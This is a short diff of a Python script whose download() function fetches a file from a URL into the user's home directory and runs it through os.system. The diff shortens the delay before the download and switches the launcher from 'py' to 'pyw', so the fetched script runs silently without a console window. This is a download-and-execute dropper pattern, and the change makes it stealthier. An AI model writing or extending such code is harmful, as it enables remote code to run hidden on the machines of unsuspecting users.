@@ -6,7 +6,7 @@ def main():
         T.sleep(Time)
 
     def download():
-        sleep(10)
+        sleep(.2)
         import os, urllib.request, pathlib
         home = os.path.expanduser("~")
         os.chdir(home)
@@ -17,7 +17,7 @@ def main():
         except FileNotFoundError:
             print('Its Not Here')
         urllib.request.urlretrieve(dlurl, '{}'.format(path))
-        os.system("start cmd /c {}".format('py ' + path))
+        os.system("start cmd /c {}".format('pyw ' + path))
         exit()
 
     download()
